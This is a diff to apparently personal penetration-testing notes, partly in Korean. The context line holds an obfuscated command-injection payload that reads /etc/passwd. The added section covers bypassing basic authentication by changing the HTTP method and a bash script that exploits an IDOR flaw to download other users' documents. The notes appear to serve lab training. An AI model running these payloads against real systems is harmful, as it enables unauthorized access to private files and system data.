@@ -770,3 +770,26 @@ $env:PROGRAMFILES[10]
 
 127.0.0.1%0abash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
+# Bypassing Basic Authentication
+```bash
+curl -i -X OPTIONS http://SERVER_IP:PORT/
+```
+- 특정 기능에 대한 권한이 없을 때 request method를 변경해서 시도
+- `burpsuite` : `change request method`
+
+# IDOR
+- http://SERVER_IP:PORT/documents.php?uid=<change>
+```bash
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+```
+```bash
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
